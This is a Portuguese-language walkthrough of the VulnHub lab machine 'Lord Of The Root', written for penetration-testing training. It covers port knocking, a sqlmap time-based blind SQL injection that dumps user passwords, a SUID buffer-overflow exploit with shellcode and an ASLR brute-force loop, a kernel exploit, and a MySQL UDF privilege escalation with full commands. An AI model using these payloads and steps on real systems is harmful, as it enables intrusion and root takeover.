---
title: "VulnHub - Lord Of The Root 1.0.1"
tags: [Linux,Medium,UDF,BurpSuite,Gobuster,Port Knocking,Buffer Overflow Linux,Kernel,SQLInjection]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/inicial.png)

Link: [Lord Of The Root 1.0.1](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/nmap2.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

> -sU --> Scan em portas UDP

### Verificamos que temos 1 porta aberta no servidor

> Porta 22 -> SSH

## Enumeração da Porta 22

Já que temos somente ela, vamos tentar entrar pra ver se temos algo ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ssh.png)

Bom, ao que deu pra entender é um Port Knocking

### Port Knocking

Qual a ideia de port knocking? Ele é utilizado para que portas que não devem estar sempre abertas fiquem fechadas e só sejam abertas quando houver o "toque", "knock" em portas específicas. De bruto modo é isso, ta, show de bola… e quais são essas portas?

Uma wiki bacana, que explica do que se trata pode ser encontrada em:

[Knock](https://wiki.archlinux.org/index.php/Port_knocking)

Então fazemos o Port Knocking nas portas 1, 2 e 3

```bash
for x in 1 2 3; do nmap -Pn --max-retries 0 -p $x 192.168.56.139; done
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock.png)

Rodamos o nmap novamente a agora apareceu a porta 1337 aberta!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock1.png)

## Enumeração da Porta 1337

Com o nmap enumeramos o que tem rodando nessa porta

```bash
nmap -sV -sC -Pn -p1337 192.168.56.139
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock2.png)

Bom, é um servidor web, então acessamos pra ver o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock3.png)

Uma imagem... Baixamos ela pra nossa máquina pra ver se tem algo escondido nela

Verificamos que não tem nada escondido nessa imagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/exiftool.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/binwalk.png)

Rodamos o Gobuster nele pra ver se encontramos mais algum diretório

```bash
gobuster dir -u http://192.168.56.139:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/gobuster1.png)

Acessamos o **/robots.txt**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/robots.png)

No código fonte vemos algo interessante

`<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/robots1.png)

Testamos a imagem com o `exiftool` e o `binwalk` pra ver se tem algo nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/exiftool1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/binwalk1.png)

Nada de interessante na imagem também

Aquele código que encontramos no código fonte parece ser um base64, então decodamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/base.png)

`/978345210/index.php` encontramos esse diretório

Acessamos e é um campo de login e senha!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login.png)

Mandamos pro BurpSuite a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login2.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login3.png)

Depois de um bom tempo bricando com essa requisição, não fui capaz de encontrar um ponto de exploração, o que eu geralmente faço em background sempre que vejo alguma requisição assim é jogar o sqlmap nele pra ver se me traz algum resultado

Salvamos em uma requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login4.png)

# Blind SQLInjection

Rodamos o sqlmap nele agora

```bash
sqlmap -r req.txt --dump
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login5.png)

Esperamos... ele encontrou um Blind SQLInjection no parâmetro Login

```
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1751 FROM (SELECT(SLEEP(5)))yIpO) AND 'XOOh'='XOOh&password=admin&submit= Login
---
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login6.png)

Agora esperamos o SQLMap fazer o time-based e me retornar os valores que preciso para dar prosseguimento na exploração da máquina

Vamos adaptando o SQLMap pra nos trazer o resultado que queremos

```bash
sqlmap -u http://192.168.56.139:1337/978345210/index.php --method POST --data "username=user&password=pass&submit=+Login+" --not-string="Username or Password is invalid" -D Webapp -T Users --dump
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login7.png)

Nos traz algumas credenciais e senhas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login8.png)

```
 +----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Acessamos o webpage com essas credenciais e não encontramos nada de útil para a exploração.

# smeagol -> root

Acessamos via SSH a máquina com as credenciais do `smeagol`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ssh.png)

Agora iniciamos a enumeração para escalarmos privilégio nessa máquina

Rodamos o linpeas para encontrar pontos de escalação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin.png)

Baixamos na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin1.png)

Rodamos na máquina virtual

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin2.png)

O que encontramos?

`Kernel` desatualizado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin3.png)

Arquivos com `SUID` habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin4.png)

Vamos mostrar a escalação desses dois modos

## Buffer Overflow

Bom, pela cara dos arquivos devemos fazer um Buffer Overflow neles pra podermos virar root nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf.png)

Verificamos o que ele faz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf1.png)

Pelas strings dele verificamos que ele tem a função `strcpy`, e essa função é vulnerável a Buffer Overflow

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf2.png)

Criamos um pattern nele pra ver em quanto ele da o crash

```bash
./file $(python -c 'print "A" * 200')
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf3.png)

Criamos um agora personalizado

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf4.png)

O binário fica mudando de porta a cada pouco, isso tem que ser verificado... quando joguei o pattern no errado ele não aparece com Segmentation Fault, antes tava na porta 1 agora ta na porta 2

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf5.png)

Encontramos o ponto de crash dele

```
0x41376641 in ?? ()
```

Agora descobrimos o ponto exato, que é 171

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf6.png)

Agora comprovamos esse crash com o pattern de 171

```bash
./file $(python -c 'print "A" * 171 + BBBB')
```

Agora está na porta 2, mas ai está, o **0x42424242** que é **BBBB**

Ou seja... Controlamos o EIP!!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf7.png)

Nós verificamos que o ASLR está habilitado, e isso vai deixar nosso endereço de memória randômico, não podemos apenas jogar o shellcode em algum lugar e especificar o EIP para lá. Adicionalmente a isso, não temos instruções JMP ESP que o programa trabalhe.

```bash
cat /proc/sys/kernel/randomize_va_space 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf8.png)

A minha ideia aqui é que nós podemos "adivinhar" ou ter a sorte da execução do programa "deslizar" até nosso shellcode, por isso vou adicionar vários NOPs logo depois do EIP.

Rodo meu payload novamente, usando um nopsled de 200

E já verifico onde está o ESP no momento da execução

Aqui vou fazer em um `file` copiado da pasta, que não está com suid habilitado, apenas pra demonstração.

```bash
run $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')
x/s $esp
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf9.png)

Excelente, ainda controlamos o EIP e o ESP está apontando para outra localização, 0xbfffee50. Nós iremos usar esse endereço como localização para o EIP, adicionalmente vamos adicionar nosso shellcode.

Um shellcode padrão que geralmente utilizo para essa atividade é esse:

http://shell-storm.org/shellcode/files/shellcode-811.php

http://shell-storm.org/shellcode/files/shellcode-827.php

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
```

Payload:

`run $(python -c 'print "A" * 171 + "\x50\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')`

Executamos na mesma instância e recebemos o shell de smeagol

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf10.png)

Agora executamos em uma instância que está com o suid habilitado, seguindo a mesma ideia de descobrir o ESP e trocar a execução ali

Por que o loop? Pois temos o ASLR habilitado, e ele vai ficar randomizando a memória toda vez que tiver a execução, uma hora ele vai bater no endereço que colocamos (pois o espaço é limitado) e com isso vamos ter a execução do nosso shellcode

```
for a in {1..1000}; do ./file $(python -c 'print "A" * 171 + "\x50\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'); done
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf11.png)

Após executar e esperar, viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf12.png)

## Kernel

Verificando a versão do kernel dele, temos um exploit que da pra escalar vulnerabilidade nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin3.png)

https://www.exploit-db.com/exploits/39166/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ker.png)

Compilamos e executamos! Somos Root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ker1.png)

## MYSQL

Também podemos escalar privilégio através do MYSQL que está sendo executado como root

```bash
ps -ef | grep mysql
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms.png)

Encontramos as credenciais de root do mysql

`$db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms0.png)

Mysql normalmente não é executado com permissões de root, isso nos abre a possibilidade de diversos pontos para escalação de privilégio nessa máquina, também se verificarmos a versão dele, é uma versão antiga

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms1.png)

Criamos nosso `/tmp/setuid.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/mm.png)

Encontramos um exploit pra ele

https://www.exploit-db.com/exploits/1518

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms2.png)

Copiamos para a máquina e compilamos ele

```
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms3.png)

Logamos no mysql como root e exploramos a vulnerabilidade

```
mysql -u root -pdarkshadow
use mysql;
create table root(line blob);
insert into root values(load_file('/home/smeagol/raptor_udf2.so'));
select * from root into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
select do_system('gcc -o /tmp/setuid /tmp/setuid.c');
select do_system('chmod u+s /tmp/setuid');
\!sh /tmp/setuid
id
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms4.png)

Agora ganhamos o shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms5.png)

# Bônus

Verificando o cron dele, vemos que ele troca o arquivo entre as pastas a cada 3 minutos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/cron.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/cron1.png)

Aqui vemos o código fonte do arquivo `file` que está vulnerável a buffer overflow

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/cron2.png)




